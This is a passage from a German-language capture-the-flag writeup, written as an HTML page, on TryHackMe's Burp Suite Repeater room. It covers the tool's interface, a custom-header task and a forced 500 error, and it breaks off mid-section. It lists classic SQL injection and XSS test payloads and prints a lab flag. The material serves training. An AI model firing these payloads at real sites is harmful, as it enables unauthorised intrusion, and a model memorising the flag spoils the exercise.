@@ -1,0 +1,1172 @@
+<!DOCTYPE html>
+<html lang="de">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>TryHackMe – Burp Suite: Repeater | Writeup</title>
+  <style>
+    :root {
+      --bg:          #0d1117;
+      --surface:     #161b22;
+      --surface2:    #1e2530;
+      --border:      #30363d;
+      --accent:      #ff6b35;
+      --accent2:     #e84393;
+      --green:       #3fb950;
+      --yellow:      #d29922;
+      --blue:        #58a6ff;
+      --purple:      #bc8cff;
+      --red:         #f85149;
+      --text:        #e6edf3;
+      --text-muted:  #8b949e;
+      --code-bg:     #0d1117;
+      --radius:      8px;
+    }
+
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+
+    body {
+      background: var(--bg);
+      color: var(--text);
+      font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
+      font-size: 15px;
+      line-height: 1.7;
+    }
+
+    /* ── Header ── */
+    header {
+      background: linear-gradient(135deg, #1a0a2e 0%, #16213e 40%, #0f3460 100%);
+      border-bottom: 2px solid var(--accent);
+      padding: 48px 32px 40px;
+      text-align: center;
+      position: relative;
+      overflow: hidden;
+    }
+    header::before {
+      content: '';
+      position: absolute;
+      inset: 0;
+      background: radial-gradient(ellipse at 50% 0%, rgba(255,107,53,.15) 0%, transparent 65%);
+    }
+    header .badge {
+      display: inline-block;
+      background: rgba(255,107,53,.15);
+      border: 1px solid var(--accent);
+      color: var(--accent);
+      font-size: 11px;
+      font-weight: 700;
+      letter-spacing: 2px;
+      text-transform: uppercase;
+      padding: 4px 14px;
+      border-radius: 20px;
+      margin-bottom: 16px;
+    }
+    header h1 {
+      font-size: 2.4rem;
+      font-weight: 800;
+      letter-spacing: -0.5px;
+      position: relative;
+    }
+    header h1 span { color: var(--accent); }
+    header .subtitle {
+      color: var(--text-muted);
+      margin-top: 10px;
+      font-size: 14px;
+    }
+    header .meta {
+      display: flex;
+      justify-content: center;
+      gap: 24px;
+      margin-top: 20px;
+      flex-wrap: wrap;
+    }
+    header .meta-item {
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      font-size: 13px;
+      color: var(--text-muted);
+    }
+    header .meta-item .dot {
+      width: 8px; height: 8px;
+      border-radius: 50%;
+    }
+    header .meta-item .dot.green  { background: var(--green); }
+    header .meta-item .dot.yellow { background: var(--yellow); }
+    header .meta-item .dot.blue   { background: var(--blue); }
+
+    /* ── Layout ── */
+    .container { max-width: 960px; margin: 0 auto; padding: 0 24px 60px; }
+
+    /* ── TOC ── */
+    nav.toc {
+      background: var(--surface);
+      border: 1px solid var(--border);
+      border-radius: var(--radius);
+      padding: 24px 28px;
+      margin: 36px 0 32px;
+    }
+    nav.toc h2 {
+      font-size: 13px;
+      font-weight: 700;
+      letter-spacing: 1.5px;
+      text-transform: uppercase;
+      color: var(--text-muted);
+      margin-bottom: 14px;
+    }
+    nav.toc ol {
+      padding-left: 20px;
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 6px 24px;
+    }
+    nav.toc a { color: var(--blue); text-decoration: none; font-size: 14px; }
+    nav.toc a:hover { text-decoration: underline; }
+
+    /* ── Sections ── */
+    section { margin-bottom: 52px; }
+    section h2 {
+      font-size: 1.5rem;
+      font-weight: 700;
+      padding-bottom: 10px;
+      border-bottom: 2px solid var(--border);
+      margin-bottom: 24px;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+    section h2 .num {
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      width: 32px; height: 32px;
+      background: var(--accent);
+      color: #fff;
+      border-radius: 6px;
+      font-size: 14px;
+      font-weight: 800;
+      flex-shrink: 0;
+    }
+    section h3 {
+      font-size: 1.1rem;
+      font-weight: 700;
+      color: var(--blue);
+      margin: 28px 0 12px;
+    }
+    section p { margin-bottom: 14px; }
+
+    /* ── Cards ── */
+    .card {
+      background: var(--surface);
+      border: 1px solid var(--border);
+      border-radius: var(--radius);
+      padding: 20px 24px;
+      margin-bottom: 16px;
+    }
+    .card.highlight { border-left: 3px solid var(--accent); }
+    .card.info      { border-left: 3px solid var(--blue); }
+    .card.success   { border-left: 3px solid var(--green); }
+    .card.warning   { border-left: 3px solid var(--yellow); }
+    .card.danger    { border-left: 3px solid var(--red); }
+
+    /* ── Grid ── */
+    .grid-2 { display: grid; grid-template-columns: 1fr 1fr; gap: 16px; }
+    .grid-3 { display: grid; grid-template-columns: repeat(3,1fr); gap: 14px; }
+    @media (max-width: 640px) {
+      .grid-2, .grid-3 { grid-template-columns: 1fr; }
+      nav.toc ol { grid-template-columns: 1fr; }
+    }
+
+    /* ── Feature cards ── */
+    .feature-card {
+      background: var(--surface2);
+      border: 1px solid var(--border);
+      border-radius: var(--radius);
+      padding: 18px;
+      text-align: center;
+    }
+    .feature-card .icon {
+      font-size: 28px;
+      margin-bottom: 10px;
+    }
+    .feature-card h4 {
+      font-size: 14px;
+      font-weight: 700;
+      color: var(--text);
+      margin-bottom: 6px;
+    }
+    .feature-card p {
+      font-size: 13px;
+      color: var(--text-muted);
+      margin: 0;
+    }
+
+    /* ── Code ── */
+    pre {
+      background: var(--code-bg);
+      border: 1px solid var(--border);
+      border-radius: var(--radius);
+      padding: 18px 20px;
+      overflow-x: auto;
+      font-family: 'Cascadia Code', 'Fira Code', 'Consolas', monospace;
+      font-size: 13px;
+      line-height: 1.6;
+      margin: 14px 0;
+    }
+    code {
+      font-family: 'Cascadia Code', 'Fira Code', 'Consolas', monospace;
+      font-size: 12.5px;
+      background: rgba(110,118,129,.1);
+      border: 1px solid var(--border);
+      padding: 2px 7px;
+      border-radius: 4px;
+      color: var(--accent);
+    }
+    pre code {
+      background: none;
+      border: none;
+      padding: 0;
+      color: var(--text);
+      font-size: 13px;
+    }
+
+    /* ── Syntax highlight helpers ── */
+    .kw  { color: var(--purple); }
+    .str { color: var(--green); }
+    .cmt { color: var(--text-muted); font-style: italic; }
+    .num { color: var(--yellow); }
+    .fn  { color: var(--blue); }
+    .hdr { color: var(--accent); }
+    .val { color: var(--green); }
+
+    /* ── Steps ── */
+    .steps { counter-reset: step; }
+    .step {
+      display: flex;
+      gap: 16px;
+      margin-bottom: 20px;
+      align-items: flex-start;
+    }
+    .step-num {
+      counter-increment: step;
+      flex-shrink: 0;
+      width: 34px; height: 34px;
+      border-radius: 50%;
+      background: var(--surface2);
+      border: 2px solid var(--accent);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-weight: 800;
+      font-size: 13px;
+      color: var(--accent);
+    }
+    .step-content { flex: 1; padding-top: 6px; }
+    .step-content strong { color: var(--text); }
+
+    /* ── Flag box ── */
+    .flag-box {
+      background: linear-gradient(135deg, rgba(63,185,80,.1), rgba(63,185,80,.04));
+      border: 1px solid var(--green);
+      border-radius: var(--radius);
+      padding: 16px 20px;
+      margin: 16px 0;
+      display: flex;
+      align-items: center;
+      gap: 14px;
+    }
+    .flag-box .flag-icon { font-size: 24px; }
+    .flag-box .flag-label {
+      font-size: 11px;
+      font-weight: 700;
+      letter-spacing: 1.5px;
+      text-transform: uppercase;
+      color: var(--green);
+    }
+    .flag-box .flag-value {
+      font-family: monospace;
+      font-size: 14px;
+      color: var(--text);
+      word-break: break-all;
+    }
+
+    /* ── Answer box ── */
+    .answer-box {
+      background: var(--surface2);
+      border: 1px solid var(--border);
+      border-radius: var(--radius);
+      padding: 14px 18px;
+      margin: 10px 0;
+      display: flex;
+      gap: 12px;
+      align-items: flex-start;
+    }
+    .answer-box .q-label {
+      color: var(--text-muted);
+      font-size: 13px;
+      min-width: 20px;
+      font-weight: 700;
+    }
+    .answer-box .q-text  { font-size: 14px; }
+    .answer-box .a-text  {
+      margin-top: 4px;
+      font-size: 13px;
+      color: var(--green);
+      font-family: monospace;
+    }
+
+    /* ── Table ── */
+    table {
+      width: 100%;
+      border-collapse: collapse;
+      font-size: 14px;
+      margin: 16px 0;
+    }
+    th {
+      background: var(--surface2);
+      padding: 10px 14px;
+      text-align: left;
+      font-size: 12px;
+      text-transform: uppercase;
+      letter-spacing: 1px;
+      color: var(--text-muted);
+      border-bottom: 1px solid var(--border);
+    }
+    td {
+      padding: 10px 14px;
+      border-bottom: 1px solid rgba(48,54,61,.5);
+    }
+    tr:hover td { background: rgba(255,255,255,.02); }
+
+    /* ── Tags ── */
+    .tag {
+      display: inline-block;
+      padding: 2px 10px;
+      border-radius: 20px;
+      font-size: 11px;
+      font-weight: 700;
+      text-transform: uppercase;
+      letter-spacing: .5px;
+    }
+    .tag.green  { background: rgba(63,185,80,.15);  color: var(--green); }
+    .tag.orange { background: rgba(255,107,53,.15); color: var(--accent); }
+    .tag.blue   { background: rgba(88,166,255,.15); color: var(--blue); }
+    .tag.purple { background: rgba(188,140,255,.15); color: var(--purple); }
+    .tag.red    { background: rgba(248,81,73,.15);  color: var(--red); }
+
+    /* ── Callout ── */
+    .callout {
+      display: flex;
+      gap: 14px;
+      padding: 14px 18px;
+      border-radius: var(--radius);
+      margin: 16px 0;
+      align-items: flex-start;
+    }
+    .callout.tip    { background: rgba(88,166,255,.08);  border: 1px solid rgba(88,166,255,.3); }
+    .callout.warn   { background: rgba(210,153,34,.08);  border: 1px solid rgba(210,153,34,.3); }
+    .callout.danger { background: rgba(248,81,73,.08);   border: 1px solid rgba(248,81,73,.3); }
+    .callout-icon { font-size: 18px; flex-shrink: 0; margin-top: 1px; }
+    .callout-body  { font-size: 14px; }
+    .callout-body strong { display: block; margin-bottom: 4px; }
+
+    /* ── Interface diagram ── */
+    .interface-diagram {
+      background: var(--surface);
+      border: 1px solid var(--border);
+      border-radius: var(--radius);
+      padding: 24px;
+      font-family: monospace;
+      font-size: 12px;
+      color: var(--text-muted);
+      line-height: 1.8;
+    }
+    .interface-diagram .region {
+      display: inline-block;
+      border: 1px dashed;
+      padding: 4px 10px;
+      border-radius: 4px;
+      font-size: 11px;
+      font-weight: 700;
+      text-transform: uppercase;
+      letter-spacing: 1px;
+    }
+    .region.accent  { border-color: var(--accent);  color: var(--accent); }
+    .region.blue    { border-color: var(--blue);    color: var(--blue); }
+    .region.green   { border-color: var(--green);   color: var(--green); }
+    .region.purple  { border-color: var(--purple);  color: var(--purple); }
+    .region.yellow  { border-color: var(--yellow);  color: var(--yellow); }
+
+    /* ── Footer ── */
+    footer {
+      border-top: 1px solid var(--border);
+      padding: 28px 24px;
+      text-align: center;
+      color: var(--text-muted);
+      font-size: 13px;
+    }
+    footer a { color: var(--blue); text-decoration: none; }
+    footer a:hover { text-decoration: underline; }
+  </style>
+</head>
+<body>
+
+<!-- ═══════════════════ HEADER ═══════════════════ -->
+<header>
+  <div class="badge">TryHackMe &mdash; Junior Penetration Tester</div>
+  <h1>Burp Suite: <span>Repeater</span></h1>
+  <p class="subtitle">Vollständiges Writeup &amp; Lernmaterialien</p>
+  <div class="meta">
+    <span class="meta-item"><span class="dot green"></span>Schwierigkeit: Easy</span>
+    <span class="meta-item"><span class="dot yellow"></span>Kategorie: Web Application Testing</span>
+    <span class="meta-item"><span class="dot blue"></span>Tool: Burp Suite Community / Pro</span>
+  </div>
+</header>
+
+<div class="container">
+
+  <!-- ═══════════════════ TOC ═══════════════════ -->
+  <nav class="toc">
+    <h2>Inhaltsverzeichnis</h2>
+    <ol>
+      <li><a href="#einleitung">Was ist der Repeater?</a></li>
+      <li><a href="#interface">Interface &amp; Oberfläche</a></li>
+      <li><a href="#views">Response-Ansichten</a></li>
+      <li><a href="#inspector">Inspector Panel</a></li>
+      <li><a href="#task1">Task 1 – Custom Header</a></li>
+      <li><a href="#task2">Task 2 – Server Error auslösen</a></li>
+      <li><a href="#task3">Task 3 – Union SQL Injection</a></li>
+      <li><a href="#sqli">SQLi Methodik</a></li>
+      <li><a href="#answers">Alle Antworten</a></li>
+      <li><a href="#fazit">Fazit &amp; Cheatsheet</a></li>
+    </ol>
+  </nav>
+
+  <!-- ═══════════════════ 1 EINLEITUNG ═══════════════════ -->
+  <section id="einleitung">
+    <h2><span class="num">1</span> Was ist der Burp Suite Repeater?</h2>
+
+    <p>Der <strong>Repeater</strong> ist eines der zentralen Werkzeuge in Burp Suite. Er erlaubt es, HTTP(S)-Anfragen beliebig oft abzuschicken, zu modifizieren und die Antworten des Servers direkt zu analysieren — ohne dass ein Browser involviert ist.</p>
+
+    <div class="card highlight">
+      <strong>Kernfunktion:</strong> Burp Suite Repeater ermöglicht es, abgefangene Requests manuell zu bearbeiten und beliebig oft an das Ziel zu senden — ideal für iteratives Testen von Schwachstellen.
+    </div>
+
+    <div class="grid-3" style="margin-top:20px;">
+      <div class="feature-card">
+        <div class="icon">&#x1F504;</div>
+        <h4>Wiederholen</h4>
+        <p>Requests exakt identisch oder leicht verändert beliebig oft absenden.</p>
+      </div>
+      <div class="feature-card">
+        <div class="icon">&#x270F;&#xFE0F;</div>
+        <h4>Modifizieren</h4>
+        <p>Parameter, Header, Body und Methode direkt im Editor anpassen.</p>
+      </div>
+      <div class="feature-card">
+        <div class="icon">&#x1F50D;</div>
+        <h4>Analysieren</h4>
+        <p>Server-Antworten im Detail untersuchen — Status, Header, Body.</p>
+      </div>
+    </div>
+
+    <h3>Wann wird der Repeater eingesetzt?</h3>
+    <table>
+      <thead>
+        <tr><th>Szenario</th><th>Beschreibung</th><th>Beispiel</th></tr>
+      </thead>
+      <tbody>
+        <tr>
+          <td><span class="tag orange">SQLi</span></td>
+          <td>SQL-Injection manuell testen und Payloads verfeinern</td>
+          <td><code>' OR 1=1--</code></td>
+        </tr>
+        <tr>
+          <td><span class="tag blue">XSS</span></td>
+          <td>Cross-Site-Scripting-Payloads iterativ einschleusen</td>
+          <td><code>&lt;script&gt;alert(1)&lt;/script&gt;</code></td>
+        </tr>
+        <tr>
+          <td><span class="tag green">Auth</span></td>
+          <td>Authentifizierungs-Bypässe und Token-Manipulation testen</td>
+          <td>Header manipulieren</td>
+        </tr>
+        <tr>
+          <td><span class="tag purple">API</span></td>
+          <td>API-Endpunkte auf fehlerhafte Eingaben und Logikfehler testen</td>
+          <td>Parameter verändern</td>
+        </tr>
+        <tr>
+          <td><span class="tag red">Error</span></td>
+          <td>Server-Fehler provozieren um Stack-Traces / Infos zu erhalten</td>
+          <td>Ungültige Werte senden</td>
+        </tr>
+      </tbody>
+    </table>
+
+    <h3>Repeater vs. andere Burp-Tools</h3>
+    <div class="grid-2">
+      <div class="card info">
+        <strong style="color:var(--blue)">Repeater</strong>
+        <p style="margin-top:8px;font-size:13px;color:var(--text-muted)">Manuelles, iteratives Testen. Volle Kontrolle über jeden Request. Ideal für präzise Exploits und Analyse.</p>
+      </div>
+      <div class="card">
+        <strong>Intruder</strong>
+        <p style="margin-top:8px;font-size:13px;color:var(--text-muted)">Automatisiertes Fuzzing mit Wordlisten. Gut für Brute-Force, Parameter-Fuzzing. Weniger Kontrolle pro Request.</p>
+      </div>
+      <div class="card">
+        <strong>Scanner</strong>
+        <p style="margin-top:8px;font-size:13px;color:var(--text-muted)">Automatische Schwachstellensuche (nur Pro). Schnell, aber weniger präzise als manuelles Testen.</p>
+      </div>
+      <div class="card">
+        <strong>Proxy</strong>
+        <p style="margin-top:8px;font-size:13px;color:var(--text-muted)">Abfangen und Weiterleiten von Requests. Ausgangspunkt: Requests werden von hier an den Repeater gesendet.</p>
+      </div>
+    </div>
+  </section>
+
+  <!-- ═══════════════════ 2 INTERFACE ═══════════════════ -->
+  <section id="interface">
+    <h2><span class="num">2</span> Interface &amp; Oberfläche</h2>
+
+    <p>Das Repeater-Interface besteht aus <strong>sechs Hauptbereichen</strong>. Das Verständnis der Oberfläche ist essenziell für effizientes Arbeiten.</p>
+
+    <div class="interface-diagram">
+      <div style="display:grid;grid-template-columns:1fr;gap:8px;">
+        <div style="border:1px solid var(--border);border-radius:6px;padding:10px;">
+          <span class="region accent">&#x2460; Request List</span>
+          <span style="margin-left:12px;font-size:11px;color:var(--text-muted)">Tabs für mehrere gleichzeitige Requests (z.B. Request 1, Request 2 ...)</span>
+        </div>
+        <div style="border:1px solid var(--border);border-radius:6px;padding:10px;">
+          <span class="region blue">&#x2461; Request Controls</span>
+          <span style="margin-left:12px;font-size:11px;color:var(--text-muted)">Send &bull; Cancel &bull; &lt; Vorherige Antwort &bull; Nächste Antwort &gt;</span>
+        </div>
+        <div style="display:grid;grid-template-columns:1fr 1fr;gap:8px;">
+          <div style="border:1px solid var(--border);border-radius:6px;padding:10px;">
+            <span class="region green">&#x2462; Request View</span><br/>
+            <span style="font-size:11px;color:var(--text-muted)">Editierbarer HTTP-Request</span>
+          </div>
+          <div style="border:1px solid var(--border);border-radius:6px;padding:10px;">
+            <span class="region green">&#x2462; Response View</span><br/>
+            <span style="font-size:11px;color:var(--text-muted)">Server-Antwort (read-only)</span>
+          </div>
+        </div>
+        <div style="display:grid;grid-template-columns:2fr 1fr;gap:8px;">
+          <div style="border:1px solid var(--border);border-radius:6px;padding:10px;">
+            <span class="region yellow">&#x2463; Layout Options</span>
+            <span style="margin-left:12px;font-size:11px;color:var(--text-muted)">Horizontal / Vertikal / Tabs</span>
+          </div>
+          <div style="border:1px solid var(--border);border-radius:6px;padding:10px;">
+            <span class="region accent">&#x2465; Target</span>
+            <span style="margin-left:8px;font-size:11px;color:var(--text-muted)">IP:Port</span>
+          </div>
+        </div>
+        <div style="border:1px solid var(--border);border-radius:6px;padding:10px;">
+          <span class="region purple">&#x2464; Inspector Panel</span>
+          <span style="margin-left:12px;font-size:11px;color:var(--text-muted)">Strukturierte Darstellung: Query-Parameter, Headers, Cookies, Body, Request-Attribute</span>
+        </div>
+      </div>
+    </div>
+
+    <h3>Detailbeschreibung der Bereiche</h3>
+
+    <div class="card">
+      <strong style="color:var(--accent)">&#x2460; Request List (Tabs)</strong>
+      <p style="margin-top:8px;font-size:14px;">Oben im Repeater-Fenster. Hier können mehrere HTTP-Requests als separate Tabs verwaltet werden. Neue Tabs entstehen durch Senden weiterer Requests aus dem Proxy.</p>
+    </div>
+
+    <div class="card">
+      <strong style="color:var(--blue)">&#x2461; Request Controls</strong>
+      <p style="margin-top:8px;font-size:14px;">Die Steuerungsleiste enthält:</p>
+      <ul style="margin-top:8px;padding-left:20px;font-size:14px;">
+        <li><code>Send</code> — Request abschicken und Antwort empfangen</li>
+        <li><code>Cancel</code> — Laufenden Request abbrechen</li>
+        <li><code>&lt;</code> / <code>&gt;</code> — Durch die Verlaufshistorie navigieren (undo/redo für Requests)</li>
+      </ul>
+    </div>
+
+    <div class="card">
+      <strong style="color:var(--green)">&#x2462; Request- und Response-Ansicht</strong>
+      <p style="margin-top:8px;font-size:14px;">Der <strong>Request-Bereich</strong> links ist vollständig editierbar. Hier werden Methode, URL, Header und Body manuell angepasst. Der <strong>Response-Bereich</strong> rechts zeigt die Serverantwort nach dem Senden — nur lesbar, aber in verschiedenen Formaten darstellbar.</p>
+    </div>
+
+    <div class="card">
+      <strong style="color:var(--yellow)">&#x2463; Layout Options</strong>
+      <p style="margin-top:8px;font-size:14px;">Drei Darstellungsoptionen für Request und Response nebeneinander:</p>
+      <ul style="margin-top:8px;padding-left:20px;font-size:14px;">
+        <li><strong>Horizontal</strong> — Request oben, Response unten</li>
+        <li><strong>Vertikal</strong> — Request links, Response rechts (Standard)</li>
+        <li><strong>Tabs</strong> — Request und Response in separaten Tabs</li>
+      </ul>
+    </div>
+
+    <div class="card">
+      <strong style="color:var(--purple)">&#x2464; Inspector Panel</strong>
+      <p style="margin-top:8px;font-size:14px;">Rechtes Panel. Bricht den Request/Response in strukturierte, bearbeitbare Komponenten auf — besonders hilfreich für Anfänger oder komplexe Requests.</p>
+    </div>
+
+    <div class="card">
+      <strong style="color:var(--accent)">&#x2465; Target Field</strong>
+      <p style="margin-top:8px;font-size:14px;">Zeigt die Zieladresse (IP und Port). Normalerweise automatisch gesetzt, wenn ein Request aus dem Proxy übertragen wird.</p>
+    </div>
+  </section>
+
+  <!-- ═══════════════════ 3 VIEWS ═══════════════════ -->
+  <section id="views">
+    <h2><span class="num">3</span> Response-Ansichten</h2>
+
+    <p>Die Serverantwort kann in vier verschiedenen Modi angezeigt werden — je nach Anwendungsfall:</p>
+
+    <div class="grid-2">
+      <div class="card highlight">
+        <strong style="color:var(--accent)">Pretty (Standard)</strong>
+        <p style="margin-top:8px;font-size:13px;color:var(--text-muted)">Automatisch formatierter und eingerückter Code. Ideal für HTML, JSON oder XML-Antworten. Erhöht die Lesbarkeit erheblich.</p>
+        <span class="tag green" style="margin-top:10px;display:inline-block;">Empfohlen</span>
+      </div>
+      <div class="card">
+        <strong>Raw</strong>
+        <p style="margin-top:8px;font-size:13px;color:var(--text-muted)">Rohe, unformatierte Serverantwort exakt so wie empfangen. Enthält alle HTTP-Header und den Body ohne Veränderung.</p>
+        <span class="tag orange" style="margin-top:10px;display:inline-block;">Analyse</span>
+      </div>
+      <div class="card">
+        <strong>Hex</strong>
+        <p style="margin-top:8px;font-size:13px;color:var(--text-muted)">Hexadezimale Byte-Darstellung der Antwort. Unverzichtbar bei Binärdaten, Bildern, komprimierten Inhalten oder zur Low-Level-Analyse.</p>
+        <span class="tag purple" style="margin-top:10px;display:inline-block;">Binärdaten</span>
+      </div>
+      <div class="card">
+        <strong>Render</strong>
+        <p style="margin-top:8px;font-size:13px;color:var(--text-muted)">Rendert die HTML-Antwort browserähnlich. Zeigt wie eine Seite aussieht — ohne JavaScript-Ausführung.</p>
+        <span class="tag blue" style="margin-top:10px;display:inline-block;">Visuell</span>
+      </div>
+    </div>
+
+    <div class="callout tip" style="margin-top:20px;">
+      <span class="callout-icon">&#x1F4A1;</span>
+      <div class="callout-body">
+        <strong>Tipp: Wann welche Ansicht?</strong>
+        Bei der Suche nach Flags oder versteckten Daten im HTML-Code immer <strong>Pretty</strong> verwenden. Für Binary-Exploits den <strong>Hex</strong>-Modus. Um zu sehen, wie die manipulierte Seite aussieht: <strong>Render</strong>.
+      </div>
+    </div>
+  </section>
+
+  <!-- ═══════════════════ 4 INSPECTOR ═══════════════════ -->
+  <section id="inspector">
+    <h2><span class="num">4</span> Inspector Panel</h2>
+
+    <p>Das Inspector-Panel auf der rechten Seite des Repeaters zerlegt den HTTP-Request und die Response in strukturierte, bearbeitbare Sektionen. Besonders für Anfänger bietet es eine übersichtlichere Alternative zum direkten Bearbeiten des Raw-Requests.</p>
+
+    <div class="grid-2">
+      <div>
+        <h3>Request Inspector</h3>
+        <table>
+          <thead><tr><th>Sektion</th><th>Inhalt</th></tr></thead>
+          <tbody>
+            <tr><td><strong>Request Attributes</strong></td><td>HTTP-Methode, Protokoll-Version, Ressourcenpfad</td></tr>
+            <tr><td><strong>Query Parameters</strong></td><td>GET-Parameter aus der URL (<code>?key=value</code>)</td></tr>
+            <tr><td><strong>Body Parameters</strong></td><td>POST-Daten im Request-Body</td></tr>
+            <tr><td><strong>Request Cookies</strong></td><td>Alle gesendeten Cookies</td></tr>
+            <tr><td><strong>Request Headers</strong></td><td>HTTP-Header wie <code>User-Agent</code>, <code>Content-Type</code></td></tr>
+          </tbody>
+        </table>
+      </div>
+      <div>
+        <h3>Response Inspector</h3>
+        <table>
+          <thead><tr><th>Sektion</th><th>Inhalt</th></tr></thead>
+          <tbody>
+            <tr><td><strong>Response Cookies</strong></td><td>Vom Server gesetzte Cookies (<code>Set-Cookie</code>)</td></tr>
+            <tr><td><strong>Response Headers</strong></td><td>Alle Server-Antwort-Header</td></tr>
+          </tbody>
+        </table>
+        <div class="callout warn" style="margin-top:16px;">
+          <span class="callout-icon">&#x26A0;&#xFE0F;</span>
+          <div class="callout-body">
+            <strong>Wichtig</strong>
+            Änderungen im Inspector werden sofort in den Raw-Request übernommen — beide Ansichten sind synchronisiert.
+          </div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- ═══════════════════ 5 TASK 1 ═══════════════════ -->
+  <section id="task1">
+    <h2><span class="num">5</span> Task 1 – Custom Header hinzufügen</h2>
+
+    <div class="card info">
+      <strong>Ziel:</strong> Einen Request an den Server senden und durch Hinzufügen des Headers <code>FlagAuthorised: True</code> eine Flag freischalten.
+    </div>
+
+    <h3>Ablauf</h3>
+    <div class="steps">
+      <div class="step">
+        <div class="step-num"></div>
+        <div class="step-content">
+          <strong>Request im Proxy abfangen</strong>
+          <p>Im Browser FoxyProxy aktivieren (Burp Suite als Proxy konfiguriert). Die Zielseite aufrufen und den Request im Proxy-Tab abfangen.</p>
+        </div>
+      </div>
+      <div class="step">
+        <div class="step-num"></div>
+        <div class="step-content">
+          <strong>An Repeater senden</strong>
+          <p>Im Proxy-Tab: Rechtsklick auf den abgefangenen Request → <em>Send to Repeater</em> (oder Tastenkürzel <kbd>Ctrl+R</kbd>). Zum Repeater-Tab wechseln.</p>
+        </div>
+      </div>
+      <div class="step">
+        <div class="step-num"></div>
+        <div class="step-content">
+          <strong>Ersten Test-Send</strong>
+          <p>Request ohne Änderungen mit <em>Send</em> absenden und die normale Serverantwort begutachten.</p>
+        </div>
+      </div>
+      <div class="step">
+        <div class="step-num"></div>
+        <div class="step-content">
+          <strong>Header hinzufügen</strong>
+          <p>Im Request-Editor am Ende des Header-Blocks (nach dem letzten Header, vor der Leerzeile) folgende Zeile einfügen:</p>
+          <pre><code><span class="hdr">FlagAuthorised</span>: <span class="val">True</span></code></pre>
+        </div>
+      </div>
+      <div class="step">
+        <div class="step-num"></div>
+        <div class="step-content">
+          <strong>Request erneut senden</strong>
+          <p>Mit <em>Send</em> abschicken. In der Response-Ansicht (Pretty-Modus) die Flag im HTML-Body suchen.</p>
+        </div>
+      </div>
+    </div>
+
+    <h3>Beispiel-Request</h3>
+    <pre><code><span class="kw">GET</span> / <span class="str">HTTP/1.1</span>
+<span class="hdr">Host</span>: <span class="val">MACHINE_IP</span>
+<span class="hdr">User-Agent</span>: <span class="val">Mozilla/5.0 ...</span>
+<span class="hdr">Accept</span>: <span class="val">text/html,application/xhtml+xml,...</span>
+<span class="hdr">Connection</span>: <span class="val">close</span>
+<span class="hdr">FlagAuthorised</span>: <span class="val">True</span>
+</code></pre>
+
+    <div class="callout tip">
+      <span class="callout-icon">&#x1F4A1;</span>
+      <div class="callout-body">
+        <strong>Alternative: Inspector verwenden</strong>
+        Über das Inspector-Panel → <em>Request Headers</em> → <em>Add</em> kann der Header auch ohne direktes Editieren des Raw-Texts hinzugefügt werden.
+      </div>
+    </div>
+
+    <div class="flag-box">
+      <span class="flag-icon">&#x1F6A9;</span>
+      <div>
+        <div class="flag-label">Task 1 – Flag</div>
+        <div class="flag-value">THM{Yzg5NTU2NDM0YWI1ZDNiOTc1NjBhNjUz}</div>
+      </div>
+    </div>
+  </section>
+
+  <!-- ═══════════════════ 6 TASK 2 ═══════════════════ -->
+  <section id="task2">
+    <h2><span class="num">6</span> Task 2 – Server Error (500) auslösen</h2>
+
+    <div class="card info">
+      <strong>Ziel:</strong> Einen Request an den <code>/products/&lt;ID&gt;</code>-Endpunkt senden und durch Übergabe eines ungültigen (nicht-numerischen) Wertes einen HTTP 500-Fehler provozieren.
+    </div>
+
+    <h3>Hintergrund: Warum ist das wichtig?</h3>
+    <p>Server-Fehler (500 Internal Server Error) offenbaren oft wertvolle Informationen:</p>
+    <ul style="padding-left:20px;margin-bottom:14px;">
+      <li>Stack-Traces mit Dateipfaden und Zeilennummern</li>
+      <li>Verwendete Programmiersprache und Framework-Version</li>
+      <li>Datenbankfehler mit SQL-Abfrage-Fragmenten</li>
+      <li>Interne Variablennamen und Logik</li>
+    </ul>
+
+    <h3>Ablauf</h3>
+    <div class="steps">
+      <div class="step">
+        <div class="step-num"></div>
+        <div class="step-content">
+          <strong>Produkt-Request abfangen</strong>
+          <p>Im Browser ein Produkt aufrufen (z.B. <code>/products/1</code>). Den Request im Proxy abfangen und an den Repeater senden.</p>
+        </div>
+      </div>
+      <div class="step">
+        <div class="step-num"></div>
+        <div class="step-content">
+          <strong>Normalen Request testen</strong>
+          <p>Request mit <code>/products/1</code> absenden → HTTP 200, normale Produktseite.</p>
+        </div>
+      </div>
+      <div class="step">
+        <div class="step-num"></div>
+        <div class="step-content">
+          <strong>Ungültigen Wert einfügen</strong>
+          <p>Die Zahl in der URL durch einen ungültigen Wert ersetzen:</p>
+          <pre><code><span class="kw">GET</span> /products/<span class="str">abc</span> <span class="val">HTTP/1.1</span></code></pre>
+          <p>Oder durch einen sehr langen String, negativen Wert, oder Sonderzeichen.</p>
+        </div>
+      </div>
+      <div class="step">
+        <div class="step-num"></div>
+        <div class="step-content">
+          <strong>Response analysieren</strong>
+          <p>Nach dem Senden erscheint ein HTTP 500-Fehler. In der Response die Flag suchen — sie ist oft im Error-HTML eingebettet.</p>
+        </div>
+      </div>
+    </div>
+
+    <h3>Beispiel-Requests und Responses</h3>
+    <div class="grid-2">
+      <div>
+        <p style="font-size:12px;color:var(--text-muted);margin-bottom:6px;">NORMALER REQUEST (200)</p>
+        <pre><code><span class="kw">GET</span> /products/<span class="num">1</span> HTTP/1.1
+<span class="hdr">Host</span>: <span class="val">MACHINE_IP</span>
+
+<span class="cmt">→ HTTP/1.1 200 OK</span></code></pre>
+      </div>
+      <div>
+        <p style="font-size:12px;color:var(--text-muted);margin-bottom:6px;">MANIPULIERTER REQUEST (500)</p>
+        <pre><code><span class="kw">GET</span> /products/<span class="str">abc</span> HTTP/1.1
+<span class="hdr">Host</span>: <span class="val">MACHINE_IP</span>
+
+<span class="cmt">→ HTTP/1.1 500 Internal Server Error</span></code></pre>
+      </div>
+    </div>
+
+    <div class="callout warn">
+      <span class="callout-icon">&#x26A0;&#xFE0F;</span>
+      <div class="callout-body">
+        <strong>Praxisrelevanz</strong>
